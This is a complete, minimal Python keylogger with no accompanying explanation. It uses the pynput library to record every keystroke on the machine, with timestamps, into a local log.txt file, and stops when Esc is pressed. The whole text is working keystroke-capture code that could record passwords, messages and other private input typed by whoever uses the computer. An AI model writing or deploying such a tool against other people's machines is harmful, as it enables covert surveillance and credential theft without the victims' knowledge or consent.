import pynput 
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig (filename=(log_dir + "log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press) as listener:
    listener.join() 